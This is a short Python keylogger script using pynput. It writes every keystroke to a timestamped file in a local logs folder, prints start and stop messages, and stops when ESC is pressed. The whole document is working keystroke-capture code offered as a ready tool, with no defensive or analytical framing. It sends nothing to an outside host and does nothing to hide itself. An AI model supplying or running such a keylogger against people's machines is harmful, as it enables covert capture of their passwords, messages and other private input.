import os
from pynput import keyboard
import logging
from datetime import datetime

# Make sure logs directory exists
log_dir = "logs/"
os.makedirs(log_dir, exist_ok=True)  # ✅ This creates the folder if it doesn't exist

# Log file path
log_file = log_dir + f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Setup logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Key press handler
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Stop on ESC
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Start listening
print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
